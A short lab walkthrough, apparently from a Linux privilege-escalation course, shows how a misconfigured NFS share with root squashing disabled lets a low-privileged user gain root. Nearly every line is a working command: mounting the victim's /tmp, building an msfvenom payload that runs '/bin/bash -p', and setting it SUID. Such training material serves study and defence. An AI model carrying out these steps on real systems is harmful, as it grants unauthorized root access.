Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

**Check the NFS share configuration on the Debian VM:**
```python
cat /etc/exports
```
Note that the **/tmp** share has root squashing disabled.

**On your Kali box, switch to your root user if you are not already running as root:**
```python
sudo su
```

**Using Kali's root user, create a mount point on your Kali box and mount the "/tmp" share (update the IP accordingly):**
```python
mkdir /tmp/nfs   
mount -o rw,vers=3 VICTIM_IP:/tmp /tmp/nfs
```

**Still using Kali's root user, generate a payload using "msfvenom" and save it to the mounted share (this payload simply calls /bin/bash):**
```python
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

**Still using Kali's root user, make the file executable and set the SUID permission:**
```python
chmod +xs /tmp/nfs/shell.elf
```

**Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:**
```python
/tmp/shell.elf
```


